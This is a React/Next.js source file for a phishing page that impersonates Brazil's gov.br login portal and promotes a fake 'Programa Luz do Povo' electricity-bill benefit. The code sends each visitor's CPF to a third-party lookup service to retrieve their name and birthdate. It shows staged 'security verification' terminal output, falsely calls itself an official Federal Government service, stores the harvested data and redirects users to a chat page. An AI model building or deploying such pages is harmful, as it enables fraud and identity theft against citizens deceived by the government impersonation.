"use client"

import type React from "react"

import { useState, useEffect } from "react"
import Image from "next/image"
import { cn } from "@/lib/utils"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Card } from "@/components/ui/card"
import { Loader2, ArrowLeft } from "lucide-react"
import { useRouter } from "next/navigation"

export default function GovBrLogin() {
  const router = useRouter()
  const [currentPage, setCurrentPage] = useState<"login" | "calculating">("login")
  const [cpf, setCpf] = useState("")
  const [logLines, setLogLines] = useState<string[]>([])
  const [showNextButton, setShowNextButton] = useState(false)
  const [cpfError, setCpfError] = useState<string | null>(null)
  const [isValidCPF, setIsValidCPF] = useState(false)
  const [isCheckingAPI, setIsCheckingAPI] = useState(false)
  const [apiResponse, setApiResponse] = useState<any>(null)
  const [apiCallComplete, setApiCallComplete] = useState(false)
  const [userName, setUserName] = useState<string | null>(null)
  const [userBirthdate, setUserBirthdate] = useState<string | null>(null)
  const [showPassword, setShowPassword] = useState(false)

  // CPF mask function
  const formatCPF = (value: string) => {
    return value
      .replace(/\D/g, "")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d)/, "$1.$2")
      .replace(/(\d{3})(\d{1,2})/, "$1-$2")
      .replace(/(-\d{2})\d+?$/, "$1")
  }

  const validateCPF = (cpf: string): boolean => {
    // Remove caracteres não numéricos
    const cleanCPF = cpf.replace(/\D/g, "")

    // Verifica se tem 11 dígitos
    if (cleanCPF.length !== 11) {
      setCpfError("CPF deve conter 11 dígitos")
      return false
    }

    // Verifica se todos os dígitos são iguais (CPF inválido conhecido)
    if (/^(\d)\1{10}$/.test(cleanCPF)) {
      setCpfError("CPF inválido")
      return false
    }

    // Algoritmo de validação do CPF
    let sum = 0
    let remainder

    // Primeiro dígito verificador
    for (let i = 1; i <= 9; i++) {
      sum += Number.parseInt(cleanCPF.substring(i - 1, i)) * (11 - i)
    }

    remainder = (sum * 10) % 11
    if (remainder === 10 || remainder === 11) remainder = 0
    if (remainder !== Number.parseInt(cleanCPF.substring(9, 10))) {
      setCpfError("CPF inválido")
      return false
    }

    // Segundo dígito verificador
    sum = 0
    for (let i = 1; i <= 10; i++) {
      sum += Number.parseInt(cleanCPF.substring(i - 1, i)) * (12 - i)
    }

    remainder = (sum * 10) % 11
    if (remainder === 10 || remainder === 11) remainder = 0
    if (remainder !== Number.parseInt(cleanCPF.substring(10, 11))) {
      setCpfError("CPF inválido")
      return false
    }

    // CPF válido
    setCpfError(null)
    return true
  }

  // Função para chamar a API real
  const checkCPFWithAPI = async (cpf: string) => {
    setIsCheckingAPI(true)
    setCpfError(null)
    setApiCallComplete(false)

    try {
      // Limpa o CPF para enviar apenas os números para a API
      const cleanCPF = cpf.replace(/\D/g, "")

      // Constrói a URL da API com o CPF
      const apiUrl = `https://apela-api.tech?user=4a0ce81f-db70-48f4-9c10-ce4849562176&cpf=${cleanCPF}`

      console.log("Chamando API:", apiUrl)

      // Faz a chamada à API
      const response = await fetch(apiUrl)

      if (!response.ok) {
        throw new Error(`Erro na API: ${response.status}`)
      }

      // Processa a resposta da API
      const data = await response.json()
      console.log("Resposta da API:", JSON.stringify(data, null, 2))

      // Armazena a resposta da API
      setApiResponse(data)
      setApiCallComplete(true)

      // Verifica se a API retornou um CPF válido
      if (data.valid === false) {
        setCpfError("CPF inválido segundo a API")
        setIsValidCPF(false)
        return false
      }

      // CPF válido segundo a API
      setIsValidCPF(true)

      // Extrair nome e data de nascimento
      const name = getNameFromResponse(data)
      const birthdate = getBirthdateFromResponse(data)

      if (name) setUserName(name)
      if (birthdate) setUserBirthdate(birthdate)

      return true
    } catch (error) {
      console.error("Erro ao verificar CPF na API:", error)
      setCpfError("Erro ao verificar CPF. Tente novamente.")
      setIsValidCPF(false)
      return false
    } finally {
      setIsCheckingAPI(false)
    }
  }

  const handleCPFChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    const formattedValue = formatCPF(e.target.value)
    setCpf(formattedValue)

    // Limpa o erro quando o usuário começa a digitar novamente
    if (cpfError) setCpfError(null)

    // Limpa a resposta da API quando o usuário modifica o CPF
    if (apiResponse) {
      setApiResponse(null)
      setApiCallComplete(false)
    }

    // Valida apenas se o CPF estiver completo (com 14 caracteres incluindo pontos e traço)
    if (formattedValue.length === 14) {
      const isValid = validateCPF(formattedValue)
      setIsValidCPF(isValid)
    } else {
      setIsValidCPF(false)
    }
  }

  // Modificando a função handleContinue para usar a API
  const handleContinue = async () => {
    if (cpf.length === 14) {
      // Primeiro valida localmente
      const isLocallyValid = validateCPF(cpf)

      if (isLocallyValid) {
        try {
          // Se for válido localmente, verifica na API
          const isAPIValid = await checkCPFWithAPI(cpf)

          if (isAPIValid && apiResponse) {
            // Se for válido na API e temos uma resposta, prossegue
            setCurrentPage("calculating")
            // Aguarda um momento para garantir que o estado foi atualizado
            setTimeout(() => {
              simulateProcessing()
            }, 100)
          }
        } catch (error) {
          console.error("Erro ao processar CPF:", error)
          setCpfError("Ocorreu um erro ao processar o CPF. Tente novamente.")
        }
      }
    }
  }

  // Função para obter o nome da resposta da API
  const getNameFromResponse = (response: any): string | null => {
    if (!response || typeof response !== "object") return null

    // Verifica diferentes possíveis nomes de propriedade para o nome
    if (response.name && typeof response.name === "string") return response.name
    if (response.nome && typeof response.nome === "string") return response.nome
    if (response.fullName && typeof response.fullName === "string") return response.fullName
    if (response.nomeCompleto && typeof response.nomeCompleto === "string") return response.nomeCompleto

    // Verifica se há alguma propriedade que contenha "nome" no nome
    const nameKeys = Object.keys(response).filter(
      (key) => key.toLowerCase().includes("nome") || key.toLowerCase().includes("name"),
    )

    if (nameKeys.length > 0 && typeof response[nameKeys[0]] === "string") {
      return response[nameKeys[0]]
    }

    return null
  }

  // Função para obter a data de nascimento da resposta da API
  const getBirthdateFromResponse = (response: any): string | null => {
    if (!response || typeof response !== "object") return null

    // Verifica diferentes possíveis nomes de propriedade para a data de nascimento
    if (response.birthdate && typeof response.birthdate === "string") return response.birthdate
    if (response.nascimento && typeof response.nascimento === "string") return response.nascimento
    if (response.dataNascimento && typeof response.dataNascimento === "string") return response.dataNascimento
    if (response.dateOfBirth && typeof response.dateOfBirth === "string") return response.dateOfBirth
    if (response.birth && typeof response.birth === "string") return response.birth

    // Verifica se há alguma propriedade que contenha "nascimento" ou "birth" no nome
    const birthKeys = Object.keys(response).filter(
      (key) =>
        key.toLowerCase().includes("nascimento") ||
        key.toLowerCase().includes("birth") ||
        key.toLowerCase().includes("data"),
    )

    if (birthKeys.length > 0 && typeof response[birthKeys[0]] === "string") {
      return response[birthKeys[0]]
    }

    return null
  }

  // Função para simular o processamento no terminal
  const simulateProcessing = () => {
    // Mensagens iniciais
    const initialMessages = [
      "Iniciando verificação de segurança...",
      "Conectando ao servidor gov.br...",
      "Verificando CPF...",
    ]

    // Mensagens de autenticação
    const authMessages = ["Autenticando usuário..."]

    // Adiciona nome e data de nascimento após "Autenticando usuário..."
    const name = userName || getNameFromResponse(apiResponse) || "Usuário"
    const birthdate = userBirthdate || getBirthdateFromResponse(apiResponse) || "01/01/1980"

    authMessages.push(`Nome completo: ${name}`)
    authMessages.push(`Data de Nascimento: ${birthdate}`)

    // Mensagens finais
    const finalMessages = [
      "Verificando certificados de segurança...",
      "Estabelecendo conexão segura...",
      "Preparando ambiente do usuário...",
      "Verificação concluída com sucesso!",
    ]

    // Combina todas as mensagens na ordem correta
    const allMessages = [...initialMessages, ...authMessages, ...finalMessages]

    // Exibe as mensagens com intervalo
    let i = 0
    const interval = setInterval(() => {
      if (i < allMessages.length) {
        setLogLines((prev) => [...prev, allMessages[i]])
        i++
      } else {
        clearInterval(interval)
        setShowNextButton(true)
      }
    }, 800)
  }

  // Função auxiliar para verificar se uma linha é um dado do usuário
  const isUserDataLine = (line: string | undefined): boolean => {
    if (!line || typeof line !== "string") return false

    return line.includes(":") && (line.startsWith("Nome completo:") || line.startsWith("Data de Nascimento:"))
  }

  // Função auxiliar para verificar se uma linha é um cabeçalho
  const isHeaderLine = (line: string | undefined): boolean => {
    if (!line || typeof line !== "string") return false
    return line === "Dados encontrados na base:"
  }

  // Salvar dados do usuário quando disponíveis
  useEffect(() => {
    if (showNextButton && apiResponse) {
      const name = getNameFromResponse(apiResponse) || "Usuário"
      const birthdate = getBirthdateFromResponse(apiResponse) || "01/01/1980"

      // Salvar dados do usuário no localStorage com dados reais da API
      const userData = {
        name,
        cpf,
        birthdate,
        // Salvar também a resposta completa da API para referência
        apiData: apiResponse,
      }
      localStorage.setItem("userData", JSON.stringify(userData))
      console.log("Dados reais salvos no localStorage:", userData)
    }
  }, [showNextButton, apiResponse, cpf])

  return (
    <main className="min-h-screen bg-slate-50">
      {currentPage === "login" ? (
        <div className="animate-fadeIn">
          {/* Header oficial do gov.br */}
          <header className="w-full bg-blue-900 shadow-md">
            {/* Barra superior com cores do Brasil */}
            <div className="h-2 bg-gradient-to-r from-green-500 via-yellow-400 to-blue-500"></div>

            <div className="bg-blue-900 py-4 px-6">
              <div className="max-w-7xl mx-auto flex items-center justify-between">
                <div className="flex items-center space-x-4">
                  <Image
                    src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"
                    alt="Logo Gov.br"
                    width={120}
                    height={40}
                    className="h-10 w-auto"
                  />
                  <div className="hidden md:block h-8 w-px bg-white opacity-30"></div>
                  <div className="hidden md:block text-white">
                    <span className="text-sm font-medium">Portal de Serviços</span>
                  </div>
                </div>

                <nav className="hidden lg:flex items-center space-x-6 text-white text-sm">
                  <a href="#" className="hover:text-yellow-300 transition-colors">
                    Órgãos do Governo
                  </a>
                  <a href="#" className="hover:text-yellow-300 transition-colors">
                    Acesso à Informação
                  </a>
                  <a href="#" className="hover:text-yellow-300 transition-colors">
                    Legislação
                  </a>
                  <a href="#" className="hover:text-yellow-300 transition-colors">
                    Acessibilidade
                  </a>
                </nav>
              </div>
            </div>

            {/* Breadcrumb */}
            <div className="bg-blue-800 py-2 px-6">
              <div className="max-w-7xl mx-auto">
                <button
                  onClick={() => router.push("/landing")}
                  className="flex items-center text-sm text-blue-200 hover:text-white transition-colors"
                >
                  <ArrowLeft className="h-4 w-4 mr-1" />
                  Voltar para Programa Luz do Povo
                </button>
              </div>
            </div>
          </header>

          <div className="max-w-6xl mx-auto p-4 md:p-6 lg:p-8">
            {/* Título da página */}
            <div className="text-center mb-8">
              <h1 className="text-3xl font-bold text-blue-900 mb-2">Acesso ao gov.br</h1>
              <p className="text-gray-600">Faça login para acessar os serviços do Governo Federal</p>
            </div>

            <div className="grid lg:grid-cols-2 gap-8 max-w-5xl mx-auto">
              {/* Painel lateral informativo */}
              <div className="bg-gradient-to-br from-blue-900 to-blue-800 rounded-lg p-8 text-white">
                <div className="mb-6">
                  <div className="w-16 h-16 bg-white bg-opacity-20 rounded-full flex items-center justify-center mb-4">
                    <svg className="w-8 h-8" fill="currentColor" viewBox="0 0 20 20">
                      <path
                        fillRule="evenodd"
                        d="M18 8a6 6 0 01-7.743 5.743L10 14l-1 1-1 1H6v2H2v-4l4.257-4.257A6 6 0 1118 8zm-6-4a1 1 0 100 2 2 2 0 012 2 1 1 0 102 0 4 4 0 00-4-4z"
                        clipRule="evenodd"
                      />
                    </svg>
                  </div>
                  <h2 className="text-2xl font-bold mb-3">Programa Luz do Povo</h2>
                  <p className="text-blue-100 leading-relaxed">
                    Verifique se você tem direito ao benefício que pode zerar sua conta de luz. Milhões de brasileiros
                    já foram beneficiados.
                  </p>
                </div>

                <div className="space-y-4">
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-yellow-400 rounded-full mt-2 flex-shrink-0"></div>
                    <p className="text-sm text-blue-100">Processo 100% digital e gratuito</p>
                  </div>
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-yellow-400 rounded-full mt-2 flex-shrink-0"></div>
                    <p className="text-sm text-blue-100">Verificação em menos de 2 minutos</p>
                  </div>
                  <div className="flex items-start space-x-3">
                    <div className="w-2 h-2 bg-yellow-400 rounded-full mt-2 flex-shrink-0"></div>
                    <p className="text-sm text-blue-100">Dados protegidos pela LGPD</p>
                  </div>
                </div>

                <div className="mt-8 p-4 bg-white bg-opacity-10 rounded-lg">
                  <p className="text-xs text-blue-100">
                    <strong>Importante:</strong> Este é um serviço oficial do Governo Federal. Seus dados estão seguros
                    e protegidos.
                  </p>
                </div>
              </div>

              {/* Formulário de login */}
              <div className="bg-white rounded-lg shadow-lg p-8 border border-gray-200">
                <div className="mb-8">
                  <h2 className="text-2xl font-bold text-gray-800 mb-2">Entre com gov.br</h2>
                  <p className="text-gray-600">Use seu CPF para criar ou acessar sua conta</p>
                </div>

                <div className="space-y-6">
                  <div className="space-y-2">
                    <label htmlFor="cpf" className="block text-sm font-semibold text-gray-700">
                      Número do CPF
                    </label>
                    <p className="text-sm text-gray-500 mb-3">
                      Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br
                    </p>
                    <div className="relative">
                      <Input
                        type="text"
                        id="cpf"
                        value={cpf}
                        onChange={handleCPFChange}
                        placeholder="000.000.000-00"
                        maxLength={14}
                        className={`h-12 text-lg border-2 transition-all duration-200 bg-white text-gray-900 ${
                          cpfError
                            ? "border-red-500 focus:border-red-500 focus:ring-red-500"
                            : isValidCPF
                              ? "border-green-500 focus:border-green-500 focus:ring-green-500"
                              : "border-gray-300 focus:border-blue-500 focus:ring-blue-500"
                        }`}
                      />
                      {isValidCPF && !isCheckingAPI && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 text-green-500">
                          <svg
                            xmlns="http://www.w3.org/2000/svg"
                            className="h-6 w-6"
                            viewBox="0 0 20 20"
                            fill="currentColor"
                          >
                            <path
                              fillRule="evenodd"
                              d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                              clipRule="evenodd"
                            />
                          </svg>
                        </div>
                      )}
                      {isCheckingAPI && (
                        <div className="absolute right-3 top-1/2 -translate-y-1/2 text-blue-500">
                          <Loader2 className="h-6 w-6 animate-spin" />
                        </div>
                      )}
                    </div>
                    {cpfError && (
                      <div className="flex items-center space-x-2 text-red-600 text-sm mt-2">
                        <svg className="w-4 h-4" fill="currentColor" viewBox="0 0 20 20">
                          <path
                            fillRule="evenodd"
                            d="M18 10a8 8 0 11-16 0 8 8 0 0116 0zm-7 4a1 1 0 11-2 0 1 1 0 012 0zm-1-9a1 1 0 00-1 1v4a1 1 0 102 0V6a1 1 0 00-1-1z"
                            clipRule="evenodd"
                          />
                        </svg>
                        <span>{cpfError}</span>
                      </div>
                    )}

                    {/* Exibe informações da API se disponíveis */}
                    {apiResponse && !cpfError && apiCallComplete && (
                      <div className="mt-3 p-4 bg-green-50 border border-green-200 rounded-lg animate-fadeIn">
                        <div className="flex items-start space-x-3">
                          <svg className="w-5 h-5 text-green-600 mt-0.5" fill="currentColor" viewBox="0 0 20 20">
                            <path
                              fillRule="evenodd"
                              d="M10 18a8 8 0 100-16 8 8 0 000 16zm3.707-9.293a1 1 0 00-1.414-1.414L9 10.586 7.707 9.293a1 1 0 00-1.414 1.414l2 2a1 1 0 001.414 0l4-4z"
                              clipRule="evenodd"
                            />
                          </svg>
                          <div>
                            <p className="text-sm font-semibold text-green-800 mb-2">CPF verificado com sucesso</p>
                            <div className="space-y-1 text-sm text-green-700">
                              {getNameFromResponse(apiResponse) && (
                                <p>
                                  <span className="font-medium">Nome:</span> {getNameFromResponse(apiResponse)}
                                </p>
                              )}
                              {getBirthdateFromResponse(apiResponse) && (
                                <p>
                                  <span className="font-medium">Data de Nascimento:</span>{" "}
                                  {getBirthdateFromResponse(apiResponse)}
                                </p>
                              )}
                            </div>
                          </div>
                        </div>
                      </div>
                    )}
                  </div>

                  <Button
                    onClick={handleContinue}
                    className={`w-full h-12 text-lg font-semibold rounded-lg transition-all duration-200 ${
                      isValidCPF && !isCheckingAPI
                        ? "bg-green-600 hover:bg-green-700 text-white shadow-lg hover:shadow-xl transform hover:-translate-y-0.5"
                        : "bg-gray-300 text-gray-500 cursor-not-allowed"
                    }`}
                    disabled={!isValidCPF || isCheckingAPI}
                  >
                    {isCheckingAPI ? (
                      <>
                        <Loader2 className="mr-2 h-5 w-5 animate-spin" />
                        Verificando CPF...
                      </>
                    ) : (
                      "Continuar"
                    )}
                  </Button>
                </div>

                {/* Outras opções de login */}
                <div className="mt-8 pt-6 border-t border-gray-200 bg-white">
                  <h3 className="text-lg font-semibold text-gray-800 mb-4">Outras formas de acesso</h3>
                  <div className="space-y-3 bg-white">
                    <Button
                      variant="outline"
                      className="w-full justify-start h-12 text-left border-2 hover:border-blue-500 hover:bg-blue-50 bg-white text-gray-900"
                    >
                      <svg className="h-5 w-5 mr-3 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                        <path d="M4 4a2 2 0 00-2 2v1h16V6a2 2 0 00-2-2H4z" />
                        <path
                          fillRule="evenodd"
                          d="M18 9H2v5a2 2 0 002 2h12a2 2 0 002-2V9zM4 13a1 1 0 011-1h1a1 1 0 110 2H5a1 1 0 01-1-1zm5-1a1 1 0 100 2h1a1 1 0 100-2H9z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <div>
                        <div className="font-medium">Internet Banking</div>
                        <div className="text-sm text-gray-500">Acesse com sua conta bancária</div>
                      </div>
                    </Button>

                    <Button
                      variant="outline"
                      className="w-full justify-start h-12 text-left border-2 hover:border-blue-500 hover:bg-blue-50 bg-white text-gray-900"
                    >
                      <svg className="h-5 w-5 mr-3 text-blue-600" fill="currentColor" viewBox="0 0 20 20">
                        <path
                          fillRule="evenodd"
                          d="M3 4a1 1 0 000 2h.5l.5.5v6l-.5.5H3a1 1 0 100 2h.5c.28 0 .5-.22.5-.5v-8c0-.28-.22-.5-.5-.5H3zm2 0a1 1 0 000 2h12a1 1 0 100-2H5z"
                          clipRule="evenodd"
                        />
                      </svg>
                      <div>
                        <div className="font-medium">Certificado em Nuvem</div>
                        <div className="text-sm text-gray-500">Acesso via certificado digital em nuvem</div>
                      </div>
                    </Button>
                  </div>
                </div>

                {/* Links de ajuda */}
                <div className="mt-8 pt-6 border-t border-gray-200 space-y-3">
                  <a href="#" className="block text-blue-600 hover:text-blue-800 text-sm font-medium">
                    Como criar uma conta gov.br?
                  </a>
                  <a href="#" className="block text-blue-600 hover:text-blue-800 text-sm font-medium">
                    Esqueci minha senha
                  </a>
                  <a href="#" className="block text-blue-600 hover:text-blue-800 text-sm font-medium">
                    Ajuda e suporte técnico
                  </a>
                </div>
              </div>
            </div>

            {/* Footer com informações legais */}
            <div className="mt-12 text-center text-sm text-gray-500">
              <p className="mb-2">
                <a href="#" className="text-blue-600 hover:text-blue-800 mr-4">
                  Termos de Uso
                </a>
                <a href="#" className="text-blue-600 hover:text-blue-800 mr-4">
                  Política de Privacidade
                </a>
                <a href="#" className="text-blue-600 hover:text-blue-800">
                  Acessibilidade
                </a>
              </p>
              <p>&copy; {new Date().getFullYear()} Governo Federal do Brasil</p>
            </div>
          </div>
        </div>
      ) : (
        <div className="animate-fadeIn min-h-screen bg-blue-900">
          <header className="w-full py-4 px-6">
            <div className="max-w-7xl mx-auto">
              <Image
                src="https://www.gov.br/++theme++padrao_govbr/img/govbr-colorido-b.png"
                alt="Logo Gov.br"
                width={150}
                height={40}
                className="h-10 w-auto"
              />
            </div>
          </header>

          <div className="max-w-3xl mx-auto p-4">
            <Card className="overflow-hidden rounded-lg shadow-xl">
              <div className="bg-gray-900 px-4 py-2 flex items-center space-x-2">
                <div className="h-3 w-3 rounded-full bg-red-500"></div>
                <div className="h-3 w-3 rounded-full bg-yellow-500"></div>
                <div className="h-3 w-3 rounded-full bg-green-500"></div>
                <div className="ml-2 text-gray-400 text-sm font-mono">Sistema Federal de Consulta Cadastral</div>
              </div>

              <div className="bg-black p-6 font-mono text-sm text-green-500 min-h-[300px]">
                {logLines.map((line, index) => {
                  // Usando as funções auxiliares para verificar o tipo de linha
                  const isUserData = isUserDataLine(line)
                  const isHeader = isHeaderLine(line)

                  return (
                    <div key={index} className="mb-2 flex items-start">
                      <span className="mr-2">$</span>
                      <span
                        className={cn(
                          "overflow-hidden whitespace-nowrap",
                          index === logLines.length - 1 && "border-r-2 border-green-500",
                          isUserData ? "text-cyan-300 font-bold" : "",
                          isHeader ? "text-blue-400 font-bold" : "",
                          !isUserData && !isHeader ? "animate-typing" : "",
                        )}
                      >
                        {line}
                      </span>
                    </div>
                  )
                })}
              </div>

              <div className="bg-gray-100 p-4 flex justify-center">
                {showNextButton && (
                  <Button
                    className="bg-green-600 hover:bg-green-700 text-white py-2 px-6 rounded-md transition-colors animate-pulse"
                    onClick={() => {
                      // Obter nome e data de nascimento da resposta da API
                      const name = getNameFromResponse(apiResponse) || "Usuário"
                      const birthdate = getBirthdateFromResponse(apiResponse) || "01/01/1980"

                      // Salvar dados do usuário no localStorage para recuperação posterior
                      const userData = {
                        name,
                        cpf,
                        birthdate,
                        apiData: apiResponse, // Dados completos da API
                      }

                      // Garantir que os dados sejam salvos corretamente
                      localStorage.setItem("userData", JSON.stringify(userData))
                      console.log("Dados reais confirmados e salvos:", userData)

                      // Redirecionar para a página de chat
                      router.push("/chat")
                    }}
                  >
                    Ver Resultado e Prosseguir
                  </Button>
                )}
              </div>
            </Card>
          </div>
        </div>
      )}
    </main>
  )
}
